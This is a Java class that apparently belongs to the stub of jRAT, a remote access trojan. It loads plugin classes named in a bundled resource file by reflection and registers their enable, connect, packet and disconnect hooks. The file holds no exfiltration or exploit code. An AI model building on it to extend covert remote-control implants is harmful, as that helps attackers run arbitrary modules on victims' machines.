package se.jrat.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import se.jrat.stub.utils.Utils;

public class Plugin {

	public static final List<Plugin> list = new ArrayList<Plugin>();

	public Object instance;
	public HashMap<String, Method> methods = new HashMap<String, Method>();
	public String name;
	public List<Object> packets = new ArrayList<Object>();

	public static void load() throws Exception {
		if (Main.class.getResourceAsStream("/plugins.dat") == null) {
			return;
		}

		String str = Utils.readString(Main.class.getResourceAsStream("/plugins.dat"));
		String[] plugins = str.split(",");

		for (String s : plugins) {
			Plugin p = new Plugin();
			Class<?> classToLoad = Class.forName(s, true, Main.class.getClassLoader());
			p.instance = classToLoad.newInstance();

			addMethods(p, classToLoad);

			list.add(p);
		}
	}
	
	public static void addMethods(Plugin p, Class<?> classToLoad) throws Exception {
		Method onEnable = classToLoad.getMethod("onEnable", new Class[] {});
		p.methods.put("onenable", onEnable);
		onEnable.invoke(p.instance, new Object[] {});

		Method onConnect = classToLoad.getMethod("onConnect", new Class[] { DataInputStream.class, DataOutputStream.class });
		p.methods.put("onconnect", onConnect);

		Method onDisconnect = classToLoad.getMethod("onDisconnect", new Class[] { Exception.class });
		p.methods.put("ondisconnect", onDisconnect);

		Method onPacket = classToLoad.getMethod("onPacket", new Class[] { byte.class });
		p.methods.put("onpacket", onPacket);

		Method onStart = classToLoad.getMethod("onStart", new Class[] {});
		p.methods.put("onstart", onStart);

		p.name = (String) classToLoad.getMethod("getName", new Class[] {}).invoke(p.instance, new Object[] {});
	}
}
